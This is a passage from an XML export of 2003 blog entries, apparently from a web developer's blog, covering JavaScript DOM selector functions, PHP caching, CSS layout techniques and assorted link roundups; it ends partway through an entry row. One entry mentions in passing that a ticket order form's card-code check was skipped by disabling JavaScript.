	<row>
		<field name="id">839</field>
		<field name="title">Useful mySQL articles</field>
		<field name="slug">usefulMySQLArticles</field>
		<field name="body">&lt;p&gt;Paul DuBois, the author of the huge great &lt;a href=&quot;http://www.kitebird.com/mysql-book/&quot;&gt;MySQL Book&lt;/a&gt; I have sat on my bookshelf, has a whole bunch of useful MySQL articles published &lt;a href=&quot;http://www.kitebird.com/articles/&quot; title=&quot;MySQL Articles&quot;&gt;on his site&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-24 13:57:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">840</field>
		<field name="title">getElementsByClassName()</field>
		<field name="slug">getElementByClassName</field>
		<field name="body">&lt;p&gt;More handy javascript from Andy: &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/03/25#RefinedClassFetching&quot;&gt;&lt;code&gt;document.getElementsByClassName&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-25 12:36:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">841</field>
		<field name="title">Freshly Blogrolled</field>
		<field name="slug">blogrolled</field>
		<field name="body">&lt;p&gt;Recent additions to the blogroll:&lt;/p&gt;
&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://blog.mooncalf.me.uk/&quot;&gt;Andrew Hayward&lt;/a&gt; - a friend from Uni with some serious javascript skills. As well as &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/03/25#RefinedClassFetching&quot;&gt;&lt;code&gt;document.getElementbyClassName&lt;/code&gt;&lt;/a&gt;, recent innovations have included a &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/03/20#CHatTML&quot;&gt;rewrite of dChat&lt;/a&gt; (a javascript remote scripting chat application) and a &lt;a href=&quot;http://test.mooncalf.me.uk/blogEntry.tst&quot;&gt;blog entry form&lt;/a&gt; with a resizable textarea, automatic insertion of paragraph tags and a &quot;live&quot; preview pane.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.edwardbear.org/blog/&quot;&gt;Sterling Hughes&lt;/a&gt; - core &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; developer, working on &lt;a href=&quot;http://www.edwardbear.org/blog/archives/000113.html&quot; title=&quot;Assorted mod_psp Notes&quot;&gt;mod_psp&lt;/a&gt; (a Python Server Pages module) as well.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.clagnut.com/&quot;&gt;Richard Rutter&lt;/a&gt; - spotted in my referrals, a web site producer working for &lt;a href=&quot;http://www.multimap.com/&quot;&gt;Multimap&lt;/a&gt; with similar blog topics to mine (and a really nice looking site). He's an alumni of &lt;a href=&quot;http://www.bath.ac.uk/&quot; title=&quot;The University of Bath&quot;&gt;Bath&lt;/a&gt;'s chemical engineering department as well, which is nice.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.deadmime.org/~dank/blog/&quot;&gt;Dan Kalowsky&lt;/a&gt; - another &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; blogger, spotted on &lt;a href=&quot;http://www.edwardbear.org/blog/&quot;&gt;Sterling&lt;/a&gt;'s blogroll.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-03-25 13:49:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">842</field>
		<field name="title">Date-centric vs Entry-centric</field>
		<field name="slug">dateCentricVsEntryCentric</field>
		<field name="body">&lt;p&gt;When I started this blog, I made the decision to use days rather than entries as the principle navigation unit of the site. Each day's entries are grouped under a single heading for that day, archives are arranged by day (with permalinks linking to anchors on those pages) and individual entries come without titles, to emphasise the fact that they are part of a larger whole.&lt;/p&gt;

&lt;p&gt;It seemed like a good idea at the time but with hindsight, it was a mistake. The first signs of trouble came when I switched the comments system over to displaying comments on a full page rather than using popup windows. I chose to do this both for &lt;a href=&quot;http://diveintoaccessibility.org/day_16_not_opening_new_windows.html&quot; title=&quot;Day 16: Not opening new windows&quot;&gt;accessibility reasons&lt;/a&gt; and because I just didn't like them. This meant introducing a new &quot;view&quot; to my blog which displayed an entry and its associated comments (and pingbacks as well). This worked fine, but the lack of titles on entries meant the resulting page lacked an identifier at the top. It also meant that there were two potential permalinks for every piece of content - the &quot;official&quot; permalink in the context of the day the entry was posted and the permalink to the entry and its comments on a separate page.&lt;/p&gt;

&lt;p&gt;That much I could live with, although as time went by the lack of entry titles became a constant thorn (I've had several complaints that the lack of titles in my &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; feed makes it useless in some aggregators). The real problems emerged over the past few days, when I decided to implement a referral tracking system.&lt;/p&gt;

&lt;p&gt;My plan was to log the HTTP_REFERER request variable of any visit to an archive page on the site, then display them in the relevant place (like Mark Pilgrim used to do but without the automated validation and extract generation system). Logging referrals was easy enough, but when I tried to display them I ran in to problems. The permalinks on this site are actually a link to a specific day plus a fragment ID to identify the individual entry. Unfortunately, the browser only requests the &quot;real&quot; part of the URL before using the fragment ID to jump the browser screen to a specific point. The fragment ID is not included in the request, so as far as my server is controlled the request was for the whole day page.&lt;/p&gt;

&lt;p&gt;My solution is highly inelegant and features some of the hackiest &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; I've written in a long time. Instead of displaying referrals on the page they link to, I've put together a &lt;a href=&quot;/referrals/&quot;&gt;last 50 referrals&lt;/a&gt; script which displays the last 50 inbound links along with a list of shortened entries (if the link was to a day page) or the first 120 characters of an entry (if the link was to an actual entry page). It works, and it means I can get a much better idea of who is linking to me, but the code leaves a pretty bitter taste in my mouth.&lt;/p&gt;

&lt;p&gt;Hopefully I'll get a chance to do some pretty major rearchitecting of this blog over the Easter break. I want to move to an entry-centric design where the date of an entry is less prominent and the entry title is on prominent display. Permalinks will go to entry pages (although I will make sure older links continue to work) and I may even finally implement the search engine I've been promising myself for so long (the lack of titles on entries is one of the main things putting me off writing one).&lt;/p&gt;

</field>
		<field name="created">2003-03-25 17:02:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">843</field>
		<field name="title">getElementsBySelector()</field>
		<field name="slug">getElementsBySelector</field>
		<field name="body">&lt;p&gt;Inspired by &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/03/25#RefinedClassFetching&quot; title=&quot;document.getElementsByClassName&quot;&gt;Andy&lt;/a&gt;, I decided to have a crack at something I've been thinking about trying for a long time. &lt;a href=&quot;http://simonwillison.net/static/2003/getElementsBySelector.js&quot; title=&quot;getElementsBySelector.js&quot;&gt;&lt;code&gt;document.getElementsBySelector&lt;/code&gt;&lt;/a&gt; is a javascript function which takes a standard &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; style selector and returns an array of elements objects from the document that match that selector. For example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;document.getElementsBySelector('div#main p a.external')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will return an array containing all of the links that have 'external' in their &lt;code&gt;class&lt;/code&gt; attribute and are contained inside a paragraph which is itself contained inside a div with its &lt;code&gt;id&lt;/code&gt; attribute set to 'main'.&lt;/p&gt;

&lt;p&gt;So far I've only tested it on Phoenix but it seems to work as intended for the small number of test cases I've tried. If you spot any bugs please let me know. I'm about to fire up a Windows &lt;acronym title=&quot;Personal Computer&quot;&gt;PC&lt;/acronym&gt; and see how much it breaks in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;...&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; I've put together a &lt;a href=&quot;http://simonwillison.net/static/2003/getElementsBySelector.html&quot; title=&quot;document.getElementsBySelector Demo&quot;&gt;demo page&lt;/a&gt; showing the function in action. It works fine in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 6.&lt;/p&gt;</field>
		<field name="created">2003-03-25 23:38:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">844</field>
		<field name="title">Retrieving all DOM descendants</field>
		<field name="slug">retrievingAllDomDescendants</field>
		<field name="body">&lt;p&gt;First observation of the day: &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 for Windows doesn't understand &lt;code&gt;&lt;em&gt;element&lt;/em&gt;.getElementsByTagName('*')&lt;/code&gt; to retrieve all descendants of an element in the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;. &lt;code&gt;&lt;em&gt;element&lt;/em&gt;.all&lt;/code&gt; has the desired effect for that browser. So to retrieve all descendants in a way that will work on standards compliant browsers plus &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5, the following seems to be the best bet:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;var elements = element.all ? element.all : element.getElementsByTagName('*');&lt;/code&gt;&lt;/pre&gt;</field>
		<field name="created">2003-03-27 08:12:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">845</field>
		<field name="title">Attribute selectors now supported</field>
		<field name="slug">attributeSelectorsNowSupported</field>
		<field name="body">&lt;p&gt;I've updated &lt;a href=&quot;/js/getElementsBySelector.html&quot;&gt;&lt;code&gt;document.getElementsBySelector&lt;/code&gt;&lt;/a&gt; to support &lt;acronym title=&quot;Cascading Style sheets&quot;&gt;CSS&lt;/acronym&gt;2 and &lt;acronym title=&quot;Cascading Style sheets&quot;&gt;CSS&lt;/acronym&gt;3 attribute selectors, as &lt;a href=&quot;http://www.w3.org/TR/css3-selectors/#attribute-selectors&quot; title=&quot;CSS3 Selectors: 6.3 Attribute Selectors&quot;&gt;described here&lt;/a&gt;. Attribute selectors allow you to match elements based on any attribute using a variety or different rules including begins-with, ends-with, contains and more. The new version is tested in Mozilla, Phoenix and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;5/Windows (and I'm almost certain it works in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6). There is a slight bug in Opera 7 preventing the ends-with selector from working which I have been unable to track down - any Opera javascript experts out there?&lt;/p&gt;

&lt;p&gt;It has been pointed out that the function does not have the capability to deal with chained selectors such as &lt;code&gt;div#main.layoutDiv&lt;/code&gt;. I have no intention of supporting this kind of advanced &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; syntax - one of my principle design aims is to keep the code short and simple, and implementing a full parser would add a lot of bulk and complexity without significantly improving the utility of the function.&lt;/p&gt;
</field>
		<field name="created">2003-03-27 13:05:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">846</field>
		<field name="title">Why XML doesn't suck</field>
		<field name="slug">whyXMLDoesntSuck</field>
		<field name="body">&lt;p&gt;Tim Bray: &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/03/24/XMLisOK&quot;&gt;Why XML Doesn't Suck&lt;/a&gt; (a follow up to &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/03/16/XML-Prog&quot;&gt;XML Is Too Hard For Programmers&lt;/a&gt;). I'd quote the best bits but there are just too many - this article clears up all of the loose ends in my understanding of why &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; is such an important technology.&lt;/p&gt;</field>
		<field name="created">2003-03-27 16:37:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">847</field>
		<field name="title">Sergey Brin interviewed</field>
		<field name="slug">sergeyBrinInterviewed</field>
		<field name="body">&lt;p&gt;Jeremy Allaire has posted notes on an &lt;a href=&quot;http://radio.weblogs.com/0113297/2003/03/26.html#a168&quot;&gt;interview with Sergey Brin&lt;/a&gt; of Google, conducted at the PC Forum conference. Some highlights:&lt;/p&gt;

&lt;blockquote cite=&quot;http://radio.weblogs.com/0113297/2003/03/26.html#a168&quot;&gt;&lt;p&gt;
When or will you go IPO?&lt;/p&gt;

&lt;p&gt;I was really impressed with his answer on this.  He understands the incredible distraction that an IPO can be both for the management team and employees.  He says it comes down to the fact that he's just too lazy (which is clearly not the case!).  The essence is a moral response --- public markets are too short-term focused and he wants his team focused on the long-run.  Whatever the case, he admits that ultimately their employees and investors want liquidity and that will have to happen through an IPO or acquisition of Google.&lt;/p&gt;

&lt;p&gt;A person in the audience asked a very interesting question -- idea -- about Google playing a leading role in enabling the semantic web.  The basic idea was that Google should process pages and classify them into ontologies, and that they can derive lots of linked ontologies from all the content they already index.&lt;/p&gt;

&lt;p&gt;He basically said he doesn't believe in the semantic web as a set of linked RDF data-structures.  His basic argument is that the structure of natural language and what it presents is much much richer than meta-data tagging schemes.  Clearly, Google's understanding of natural language is unique, but there still is a need for machine readable APIs for data on the Internet.&lt;/p&gt;
&lt;/blockquote&gt;
</field>
		<field name="created">2003-03-29 03:09:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">848</field>
		<field name="title">Programming concepts</field>
		<field name="slug">programmingConcepts</field>
		<field name="body">&lt;p&gt;Two interesting reads relating to the &lt;a href=&quot;http://www.cs.bath.ac.uk/~jap/CM20168/&quot; title=&quot;CM20168: Programming Languages IV&quot;&gt;Programming Languages&lt;/a&gt; course I'm taking at University:&lt;/p&gt;
&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.reflectivesurface.com/weblog/archives/2003/03/26/the_evolution_of_programming_languages&quot;&gt;The evolution of programming languages&lt;/a&gt; on Reflective Surface (Ronaldo's recent &lt;a href=&quot;http://www.reflectivesurface.com/weblog/archives/2003/03/25/smalltalk_and_visualworks&quot; title=&quot;Smalltalk and VisualWorks&quot;&gt;thoughts on Smalltalk&lt;/a&gt; are worth a read as well).&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.keithdevens.com/weblog/3657&quot;&gt;Strategies for learning new languages&lt;/a&gt;, in which Keith Devens discusses the language features he looks for when trying to understand a new language.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The Reflective Surface post reminded me that &lt;a href=&quot;http://www.wikipedia.org/&quot;&gt;Wikipedia&lt;/a&gt; is traditionally excellent for programming related topics. Their overviews of &lt;a href=&quot;http://www.wikipedia.org/wiki/Functional_programming&quot;&gt;Functional Programming&lt;/a&gt;, &lt;a href=&quot;http://www.wikipedia.org/wiki/Imperative_programming&quot;&gt;Imperative Programming&lt;/a&gt; and &lt;a href=&quot;http://www.wikipedia.org/wiki/Scheme_programming_language&quot;&gt;Scheme&lt;/a&gt; all live up to their usual high standards.&lt;/p&gt; </field>
		<field name="created">2003-03-29 03:10:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">849</field>
		<field name="title">Time traveller busted for insider trading</field>
		<field name="slug">timeTravellerInsiderTrading</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://tv.yahoo.com/news/wwn/20030319/104808600007.html&quot;&gt;&quot;Time-Traveller&quot; Busted for Insider Trading&lt;/a&gt; (via &lt;a href=&quot;http://www.tmtm.com/nothing/archives/000687.html#000687&quot;&gt;Tony Bowden&lt;/a&gt;). This just &lt;em&gt;has&lt;/em&gt; to be some kind of early April fools.&lt;/p&gt;

&lt;blockquote cite=&quot;http://tv.yahoo.com/news/wwn/20030319/104808600007.html&quot;&gt;&lt;p&gt;
&quot;We don't believe this guy's story -- he's either a lunatic or a pathological liar,&quot; says an SEC insider.&lt;/p&gt;

&lt;p&gt;&quot;But the fact is, with an initial investment of only $800, in two weeks' time he had a portfolio valued at over $350 million. Every trade he made capitalized on unexpected business developments, which simply can't be pure luck. 
&lt;/p&gt;
&lt;p&gt;
Carlssin declared that he had traveled back in time from over 200 years in the future, when it is common knowledge that our era experienced one of the worst stock plunges in history. Yet anyone armed with knowledge of the handful of stocks destined to go through the roof could make a fortune.
&lt;/p&gt;&lt;p&gt;
&quot;It was just too tempting to resist,&quot; Carlssin allegedly said in his videotaped confession. &quot;I had planned to make it look natural, you know, lose a little here and there so it doesn't look too perfect. But I just got caught in the moment.&quot;
&lt;/p&gt;
&lt;p&gt;
In a bid for leniency, Carlssin has reportedly offered to divulge &quot;historical facts&quot; such as the whereabouts of Osama Bin Laden and a cure for AIDS.
&lt;/p&gt;
&lt;p&gt;
Officials are quite confident the &quot;time-traveler's&quot; claims are bogus. Yet the SEC source admits, &quot;No one can find any record of any Andrew Carlssin existing anywhere before December 2002.&quot; &lt;/p&gt;

&lt;/blockquote&gt;</field>
		<field name="created">2003-03-29 10:41:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">850</field>
		<field name="title">Ruler bookmarklet</field>
		<field name="slug">rulerBookmarklet</field>
		<field name="body">&lt;p&gt;This &lt;a href=&quot;http://centricle.com/archive/2003/03/ruler&quot; title=&quot;centricle : this favelet rules.&quot;&gt;Ruler bookmarklet&lt;/a&gt; is really cool - it shows the current coordinates of the cursor within the browser window and allows you to draw boxes and see how large they are in pixels - invaluable for tweaking &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layouts.&lt;/p&gt;</field>
		<field name="created">2003-03-29 18:52:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">851</field>
		<field name="title">SmartPHP.net</field>
		<field name="slug">smartPHP</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.smartphp.net/&quot;&gt;SmartPHP.net&lt;/a&gt; has some useful looking classes, including &lt;a href=&quot;http://www.smartphp.net/content/smarttemplate/about/about.html&quot;&gt;SmartTemplate&lt;/a&gt; (like &lt;a href=&quot;http://smarty.php.net/&quot;&gt;Smarty&lt;/a&gt; but much simpler to use) and &lt;a href=&quot;http://www.smartphp.net/content/classes/cache/class_smartcache.html&quot;&gt;SmartCache&lt;/a&gt;, a very intelligent caching class that can be used to cache data objects as well as the output from whole pages. The example given caches a database query using the &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; statement as a unique cache key:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.smartphp.net/content/classes/cache/class_smartcache.html&quot;&gt;&lt;pre&gt;&lt;code&gt;require_once &quot;class.smartcache.php&quot;;
$query  =  &quot;select * from ... where ...&quot;;
$data   =  new SmartCache( $query );
if (!$result = $data-&amp;gt;read( 120 ))     //  Reuse only 120 Seconds
{
    result  =  $db-&amp;gt;exec( $query );    //  Read DB Result
    ...
    $data-&amp;gt;write( $result );           //  Store result
}
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
</field>
		<field name="created">2003-03-29 18:53:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">852</field>
		<field name="title">Usability myths</field>
		<field name="slug">usabilityMyths</field>
		<field name="body">&lt;p&gt;&lt;acronym title=&quot;User Interface Engineering&quot;&gt;UIE&lt;/acronym&gt; &lt;a href=&quot;http://uie.com/Articles/usability_myths.htm&quot; title=&quot;Usability Myths Need Reality Checks&quot;&gt;debunk three usability &quot;myths&quot;&lt;/a&gt; (the three click rule, the idea that users give up on slow loading web sites, and the &quot;5 to 8 test subjects should post most usability problems&quot; idea). 37Signals do a pretty good job of &lt;a href=&quot;http://www.37signals.com/svn/archives/000133.php&quot; title=&quot;Usability Myths?&quot;&gt;debunking the debunkers&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-29 22:53:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">853</field>
		<field name="title">Smarter CSS positioning</field>
		<field name="slug">smarterPositioning</field>
		<field name="body">&lt;p&gt;Daniel Glazman's &lt;a href=&quot;http://daniel.glazman.free.fr/weblog/position__new.html&quot; title=&quot;Position: new&quot;&gt;proposal for smarter positioning in CSS&lt;/a&gt; (see also &lt;a href=&quot;http://daniel.glazman.free.fr/weblog/newarchive/2003_03_23_glazblogarc.html#s91416653&quot; title=&quot;&quot;&gt;this blog entry&lt;/a&gt;) makes a lot of sense.&lt;/p&gt;</field>
		<field name="created">2003-03-29 23:00:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">854</field>
		<field name="title">Clearing out some more tabs</field>
		<field name="slug">clearingMoreTabs</field>
		<field name="body">&lt;p&gt;Clearing out some more tabs:&lt;/p&gt;
&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/2003/NOTE-chips-20030128/&quot;&gt;Common HTTP Implementation Problems&lt;/a&gt; is a &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; Note describing a whole bunch of best practises for serving up documents and designing &lt;acronym title=&quot;Uniform Resource Indicators&quot;&gt;URI&lt;/acronym&gt;s.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.iraqometer.com/&quot;&gt;Iraq-O-Meter&lt;/a&gt; and &lt;a href=&quot;http://www.iraqbodycount.net/&quot;&gt;Iraq Body Count&lt;/a&gt; provide some war related statistics (both with an anti-war bias).&lt;/li&gt;
 &lt;li&gt;Salon: &lt;a href=&quot;http://archive.salon.com/21st/feature/1998/05/cov_12feature.html&quot;&gt;The dumbing-down of programming&lt;/a&gt; (from 1998).&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.xml.com/pub/a/2003/03/26/patterns.html&quot;&gt;Architectural Design Patterns for XML Documents&lt;/a&gt; on XML.com suggests adapting the Design Patterns idea to &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;, providing four examples.&lt;/li&gt;
 &lt;li&gt;Three interesting javascript articles by Sjoerd Visscher:
 &lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://w3future.com/html/stories/hop.xml&quot;&gt;Higher Order Programming&lt;/a&gt; examines Javascript's ability to use functions as values and arguments.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://w3future.com/html/stories/callbacks.xml&quot;&gt;Event Handlers and Callback Functions&lt;/a&gt; describes some clever tricks with closures that make event handling more powerful.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://w3future.com/html/beyondJS/&quot;&gt;Beyond JS&lt;/a&gt; is an intruiging javascript library with a whole bunch of weird extensions to the language.&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
 &lt;li&gt;Kevin Lynch from Macromedia is &lt;a href=&quot;http://www.klynch.com/archives/000029.html&quot; title=&quot;Blog brainstorming&quot;&gt;seeking suggestions&lt;/a&gt; for ways in which Macromedia software could be improved to help support the activity of blogging.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://developer.ez.no/sdk/ezxml&quot;&gt;eZ xml&lt;/a&gt; is a &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parser written in pure &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; that includes support for document validation using &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; Schemas.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.onlamp.com/pub/a/php/2003/03/27/php_gd.html&quot;&gt;Compiling and Enabling GD in PHP 4.3&lt;/a&gt; - apparently doing so is harder than it looks.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.simiandesign.com/blog-fu/2003/03/001478.cfm#001478&quot;&gt;Six methods of creating rounded corners in CSS&lt;/a&gt;. I'd seen most of these before, but &lt;a href=&quot;http://www.fu2k.org/alex/css/test/Corners.mhtml&quot; title=&quot;Corners - Nested divs revisited&quot;&gt;this one&lt;/a&gt; stands out in that it uses just one div and then appends the extra divs required for the corner effect using javascript and the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.onlamp.com/pub/a/php/2003/03/20/php_security.html&quot;&gt;Ten Security Checks for PHP, Part 1&lt;/a&gt; - better than my recent &lt;a href=&quot;http://www.bcss.info/courses/phpdropin/notes/security&quot;&gt;writing secure PHP&lt;/a&gt; article.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://jibbering.com/rdf-parser/&quot;&gt;Simple javascript RDF Parser and query thingy&lt;/a&gt; allows you to process &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; on the client.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.straightlinedesigns.com/mframe.htm&quot; title=&quot;Straight Line Designs&quot;&gt;Really cool furniture&lt;/a&gt; via &lt;a href=&quot;http://boingboing.net/2003_03_01_archive.html#200065776&quot; title=&quot;If Imagineers opened a furniture store&quot;&gt;BoingBoing&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.keithdevens.com/weblog/3662&quot; title=&quot;ECMAScript for XML&quot;&gt;Via Keith&lt;/a&gt;, some information on native &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; scripting in &lt;acronym title=&quot;That&amp;apos;s Javascript for the uninitiated&quot;&gt;ECMAScript&lt;/acronym&gt;:
 &lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://dev2dev.bea.com/articles/JSchneider_XML.jsp&quot;&gt;Native XML Scripting in BEA WebLogic Workshop&lt;/a&gt; provides a tutorial style introduction to the concept.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lambda.weblogs.com/discuss/msgReader$4374&quot;&gt;Native XML Scripting&lt;/a&gt; discussion on Lambda the Ultimate.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://edocs.bea.com/workshop/docs70/help/guide/xmlmap/conHandlingXMLWithECMAScriptExtensions.html&quot;&gt;Handling XML with ECMAScript Extensions&lt;/a&gt; provides the geeky details.&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-03-30 13:41:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">855</field>
		<field name="title">Glastonbury does CSS</field>
		<field name="slug">glastonburyDoesCss</field>
		<field name="body">&lt;p&gt;Cool - the new &lt;a href=&quot;http://www.glastonburyfestivals.co.uk/&quot;&gt;Glastonbury Festival&lt;/a&gt; website uses a &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layout! Unfortunately it completely fails to validate as &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; Transitional, but comes to &lt;a href=&quot;http://validator.w3.org/check?uri=http%3A%2F%2Fwww.glastonburyfestivals.co.uk%2F&amp;amp;charset=%28detect+automatically%29&amp;amp;doctype=HTML+4.01+Transitional&quot; title=&quot;Validation Results (forced doctype)&quot;&gt;within an inch&lt;/a&gt; of validating as &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; 4.01 Transitional (they just need to change the doctype, take out a few &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; specific attributes and clean up a misplaced &lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt; tag).&lt;/p&gt;

&lt;p&gt;I &lt;em&gt;think&lt;/em&gt; I've just bought my ticket. Unfortunately the &lt;a href=&quot;https://www.wayahead-secure.co.uk/aloudglastonbury/orderform.asp?showcode=78906&amp;amp;pricetype=1&amp;amp;pricetype2=2&amp;amp;pricetype3=3&amp;amp;filler1=glastonbury&quot; title=&quot;buy tickets for glastonbury 2003 from aloud.com&quot;&gt;online order form&lt;/a&gt; asked for the last 3 digits of my &lt;acronym title=&quot;Credit Card Verification&quot;&gt;CCV&lt;/acronym&gt; number which, being printed on the signature strip of my card, rubbed off a long time ago. I disabled javascript and the form submitted just fine so it'll be interesting to see if my order succeeds. If it does, chalk one up for user friendly client-side security holes :)&lt;/p&gt;</field>
		<field name="created">2003-03-31 23:05:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">856</field>
		<field name="title">Sitepoint XHTML tutorial</field>
		<field name="slug">sitepointXHTMLTurorial</field>
		<field name="body">&lt;p&gt;SitePoint are running an excellent new tutorial series: &lt;a href=&quot;http://www.sitepoint.com/article/1010&quot;&gt;XHTML Web Design for Beginners&lt;/a&gt;. There's little there for non-beginnners, but I'll certainly be sending new learners in that direction.&lt;/p&gt;</field>
		<field name="created">2003-03-31 23:09:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">857</field>
		<field name="title">I can't believe its not a table</field>
		<field name="slug">iCantBelieveItsNotATable</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_03_30_archive.shtml#91718222&quot; title=&quot;Living Can Kill You: Monday, March 31, 2003&quot;&gt;Via Craig&lt;/a&gt;, Big John's new CSS layout &lt;a href=&quot;http://www.positioniseverything.net/threecolbglong.html&quot;&gt;&quot;I can't believe it's not a table!&quot;.&lt;/a&gt; I've played with the key concept of this before: using a background-left image on the body and a background-right on an all-encompassing div to create the illusion of two columns stretching the length of the page, but I never got it working quite as well as this. Big John's layout uses that trick and a few others to get it rock solid across all browsers, then explains exactly how it all works in excruciating detail. Essential reading.&lt;/p&gt;</field>
		<field name="created">2003-03-31 23:15:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">858</field>
		<field name="title">Getting Linux to talk to an iPAQ</field>
		<field name="slug">talkingToAnIPAQ</field>
